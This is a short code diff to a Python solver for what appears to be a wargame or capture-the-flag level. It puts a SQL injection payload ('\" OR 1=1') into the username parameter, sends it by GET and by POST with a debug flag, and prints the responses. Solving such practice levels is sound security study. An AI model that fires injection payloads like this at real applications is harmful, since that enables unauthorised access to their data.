@@ -17,12 +17,15 @@ def solve(url: str, login: LevelLogin) -> Optional[str]:
     # A non-null "debug" param on a GET request will leak info about the query
     # that's executed.
     params = {
-        "username": "",
+        "username": "\" OR 1=1",
         "submit": "Check existence",
         "debug": "true",
     }
-    response = requests.get(url, auth=login, params=params)
-    print(response.text)
+    get_response = requests.get(url, auth=login, params=params)
+    print(get_response.text)
+
+    post_response = requests.post(url, auth=login, data=params)
+    print(post_response.text)
 
     return None
 
